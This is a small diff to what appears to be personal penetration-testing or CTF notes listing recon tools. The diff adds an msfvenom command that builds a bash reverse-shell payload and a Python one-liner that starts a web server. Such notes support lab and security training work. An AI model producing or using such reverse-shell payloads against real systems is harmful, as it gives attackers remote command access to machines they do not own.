@@ -38,9 +38,13 @@ wfuzz
 nikto 
 if wordpress : wpscan, take a look at upload and at the plugin 
 
+bash reverse shell with metaspoloit: 
+msfvenom -p cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw > reverse.sh
 
 During Exploit: 
 
+python webserver: 
+python3 -m http.server 8000
 
  
 
